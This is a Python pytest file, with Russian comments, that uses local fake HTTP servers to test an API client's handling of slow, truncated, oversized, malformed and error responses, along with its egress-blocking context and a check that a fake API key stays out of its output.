def test_docparse_post_drip_response_bounded_by_total_deadline_not_by_full_drip():
    """QA-обзор п.12/13: сервер отдаёт тело по байту раз в 0.12 с (полное тело —
    больше секунды) — вызов не должен растягиваться дольше запрошенного
    timeout=0.2 с, и второй/третий шаг ожидания не должен падать с
    OSError('cannot read from timed out object') — известная ловушка
    CPython SocketIO после первого таймаута на том же файловом объекте."""
    result, proc = run_script('''
        import threading, http.server, time

        class Drip(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get('Content-Length', 0)); self.rfile.read(n)
                self.send_response(200); self.end_headers()
                data = b'{"choices": [{"message": {"content": "{}"}}]}'
                for i in range(len(data)):
                    self.wfile.write(data[i:i+1]); self.wfile.flush(); time.sleep(0.12)
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Drip)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', port)
        import docparse
        payload = {"model": docparse.DEFAULT_MODEL,
                  "messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
                  "response_format": {"type": "json_schema",
                                      "json_schema": {"name": "doc", "strict": True, "schema": docparse._schema()}}}
        import app  # route/bootstrap happens before the measured HTTP operation
        status, data, err = authorized_post(payload, timeout=0.2, _base_url=f'http://127.0.0.1:{port}')
        OUT({'status': status, 'data': data, 'err': err, 'elapsed': round(authorized_post.last_elapsed, 1)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': None, 'data': None, 'err': 'timeout', 'elapsed': 0.2}


def test_docparse_post_connection_dropped_mid_body_is_read_error():
    """QA-обзор п.13: обрыв соединения в середине тела — стабильный read_error,
    не текст urllib3.ProtocolError/IncompleteRead наружу."""
    result, proc = run_script('''
        import threading, http.server

        class Truncated(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get('Content-Length', 0)); self.rfile.read(n)
                self.send_response(200)
                self.send_header('Content-Length', '1000')
                self.end_headers()
                self.wfile.write(b'{"partial": true')  # меньше заявленного Content-Length
                self.connection.close()
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Truncated)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', port)
        import docparse
        payload = {"model": docparse.DEFAULT_MODEL,
                  "messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
                  "response_format": {"type": "json_schema",
                                      "json_schema": {"name": "doc", "strict": True, "schema": docparse._schema()}}}
        status, data, err = authorized_post(payload, timeout=2, _base_url=f'http://127.0.0.1:{port}')
        OUT({'status': status, 'data': data, 'err': err})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['data'] is None
    assert result['err'] in ('read_error', 'timeout')


def test_docparse_post_oversized_response_is_controlled_error():
    result, proc = run_script('''
        import threading, http.server

        class Huge(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get('Content-Length', 0)); self.rfile.read(n)
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'[' + b'1' * (3 * 1024 * 1024) + b']')
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Huge)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', port)
        import docparse
        payload = {"model": docparse.DEFAULT_MODEL,
                  "messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
                  "response_format": {"type": "json_schema",
                                      "json_schema": {"name": "doc", "strict": True, "schema": docparse._schema()}}}
        status, data, err = authorized_post(payload, _base_url=f'http://127.0.0.1:{port}')
        OUT({'status': status, 'data': data, 'err': err})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': 200, 'data': None, 'err': 'too_large'}


def test_docparse_post_bad_json_response_is_controlled_error():
    result, proc = run_script('''
        import threading, http.server

        class Bad(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get('Content-Length', 0)); self.rfile.read(n)
                self.send_response(200); self.end_headers()
                self.wfile.write(b'not json at all')
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Bad)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', port)
        import docparse
        payload = {"model": docparse.DEFAULT_MODEL,
                  "messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
                  "response_format": {"type": "json_schema",
                                      "json_schema": {"name": "doc", "strict": True, "schema": docparse._schema()}}}
        status, data, err = authorized_post(payload, _base_url=f'http://127.0.0.1:{port}')
        OUT({'status': status, 'data': data, 'err': err})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': 200, 'data': None, 'err': 'bad_json'}


@pytest.mark.parametrize('status_code', [401, 429, 500, 503])
def test_docparse_post_http_error_statuses_pass_through_without_crash(status_code):
    result, proc = run_script(_fake_openrouter_server_script() + _valid_docparse_payload_script() + f'''
        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', _or_port)
        FakeOR.response_status = {status_code}
        FakeOR.response_body = b'{{"error": "boom"}}'

        status, data, err = authorized_post(
            VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{{_or_port}}')
        OUT({{'status': status, 'err': err, 'data': data}})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == status_code
    assert result['err'] is None
    assert result['data'] == {'error': 'boom'}


def test_openrouter_host_blocked_outside_docparse_post_active_context():
    """Прямой вызов OpenAI SDK/requests к openrouter.ai, минуя docparse_post,
    обязан отказать — контекст канала не активен."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()

        def blocked_with(fn):
            try:
                fn()
                return False
            except Exception:
                return True

        import requests
        r_blocked = blocked_with(lambda: requests.post(
            'https://openrouter.ai/api/v1/chat/completions', json={'x': 1}, timeout=2))

        import httpx
        h_blocked = blocked_with(lambda: httpx.post(
            'https://openrouter.ai/api/v1/chat/completions', json={'x': 1}, timeout=2))

        from openai import OpenAI
        client = OpenAI(base_url='https://openrouter.ai/api/v1', api_key='fake', timeout=2)
        def call_sdk():
            client.chat.completions.create(model='x', messages=[{'role': 'user', 'content': 'hi'}])
        sdk_blocked = blocked_with(call_sdk)

        OUT({'requests': r_blocked, 'httpx': h_blocked, 'sdk': sdk_blocked})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'requests': True, 'httpx': True, 'sdk': True}


def test_docparse_post_leaves_host_blocked_again_after_call_same_thread():
    result, proc = run_script(_fake_openrouter_server_script() + _valid_docparse_payload_script() + '''
        import socket
        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', _or_port)

        authorized_post(VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{_or_port}')

        blocked_after = False
        try:
            socket.getaddrinfo('openrouter.ai', 443)
        except socket.gaierror:
            blocked_after = True

        OUT({'blocked_after_call': blocked_after,
             'ctx_active_leaked': getattr(stand_egress._dp_ctx, 'active', False),
             'ctx_pairs_leaked': bool(getattr(stand_egress._dp_ctx, 'allowed_pairs', None)),
             'pending_host_leaked': getattr(stand_egress._dp_ctx, 'pending_host', None) is not None})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['blocked_after_call'] is True
    assert result['ctx_active_leaked'] is False
    assert result['ctx_pairs_leaked'] is False
    assert result['pending_host_leaked'] is False


def test_docparse_post_no_secrets_leak_in_stdout_stderr_on_failure():
    result, proc = run_script(_fake_openrouter_server_script() + _valid_docparse_payload_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', _or_port)
        FakeOR.response_status = 500
        FakeOR.response_body = b'not json, contains fake-docparse-key and other secrets'

        status, data, err = authorized_post(
            VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{_or_port}')
        OUT({'status': status, 'err': err})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': 500, 'err': 'bad_json'}
    assert 'fake-docparse-key' not in proc.stdout
    assert 'fake-docparse-key' not in proc.stderr
